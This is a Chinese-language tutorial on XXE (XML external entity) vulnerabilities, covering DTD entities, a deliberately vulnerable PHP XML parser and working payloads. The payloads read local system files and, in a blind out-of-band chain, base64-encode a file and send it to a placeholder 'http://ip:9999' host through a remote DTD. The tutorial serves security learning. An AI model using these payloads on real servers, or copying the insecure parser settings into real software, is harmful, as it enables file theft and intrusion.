# [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)

## XXE是什么

描述XXE之前，先说一下普通的XML注入，下面是例子：

```xml
<?xml version="1.0" encoding="utf8">
<USER role="guest">用户输入</USER>
```

上面代码经过注入内容"User1</USER><USER role="admin">User2"之后，变成了：

```xml
<?xml version="1.0" encoding="utf8">
<USER role="guest">User1</USER>
<USER role="admin">User2</USER>
```

上面就是最简单的xml注入例子，但是实用性并不高；

XXE是什么，XXE就是指利用注入漏洞，注入一个外部实体；

## XML基础知识

XML文档有自己的一个规范格式，这个格式是由一个叫做DTD(document type definition)的东西控制的，也就是下面这个样子：

```xml
    <?xml version="1.0"?>//这一行是 XML 文档定义
    <!DOCTYPE message [
    <!ELEMENT message (receiver ,sender ,header ,msg)>
    <!ELEMENT receiver (#PCDATA)>
    <!ELEMENT sender (#PCDATA)>
    <!ELEMENT header (#PCDATA)>
    <!ELEMENT msg (#PCDATA)>
```

上面的DTD定义了XML的根元素是message，然后元素下面有一些子元素，那么XML必须这么写：

```xml
    <message>
    <receiver>Myself</receiver>
    <sender>Someone</sender>
    <header>TheReminder</header>
    <msg>This is an amazing book</msg>
    </message>
```

除了在DTD中定义元素，我们还能定义实体（对应XML标签中的内容）；

```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe "test" >]>
```

上面定义元素为ANY表示可以接受任意元素，但是定义了一个XML实体，下面是其XML对应写法：

```xml
    <creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
    </creds>
```

使用&xxe对上面定义的实体进行调用，到时候输出时候就会替换成test；

## 划重点

1. 实体分为两种，内部实体和外部实体，上面的例子中是内部实体，但是实际上实体可以从外部的dtd文件引用；

    ```xml
        <?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
        <creds>
            <user>&xxe;</user>
            <pass>mypass</pass>
        </creds>
    ```

    这样对引用资源做的任何更新都会在文档中自动更新；

2. 实体除了可以分为内部实体和外部实体，也可以分为通用实体和参数实体；

    * 通用实体

        用&实体名;引用的实体，在DTD中定义，在XML文档中引用；

        ```xml
            <?xml version="1.0" encoding="utf-8"?>
            <!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]>
            <updateProfile>
                <firstname>Joe</firstname>
                <lastname>&file;</lastname>
                ...
            </updateProfile>
        ```

    * 参数实体

        用```% 实体名```**（空格不能少）** 在DTD中定义，并且只能在DTD中使用%实体名;引用；

        只有在DTD文件中，参数实体的声明才能引用其他实体；

        和通用实体一样，参数实体也能外部引用；

        ```xml
            <!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
            <!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
            %an-element; %remote-dtd;
        ```

## XXE怎么做

回顾上述代码，如下：

```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
    <creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
    </creds>
```

既然能读dtd，那么一旦将file路径换成敏感文件路径，是否一样可以直接读取敏感文件；

### 实验一：有回显地读本地敏感文件（Normal XXE）

该实验模拟的是服务能接收并解析XML格式的输入并且有回显的时候，我们就可以输入自定义XML，引入外部实体，引用服务器上的文件；

下面是本地服务器解析XMl的php代码：

```php
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?>
```

payload

```xml
    <?xml version="1.0" encoding="utf-8"?> 
    <!DOCTYPE creds [  
    <!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
    <creds>&goodies;</creds>
```

结果如下:

![result](https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png)

上面显示了成功读取到了想要的文件并且展示，另一种是直接获取到文件然后将文件发送到目标服务器上，这需要依赖参数实体才能做到；

### 实验二：无回显地读取本地敏感文件（Blind OOB XXE）

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'>">
```

```xml
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>
```
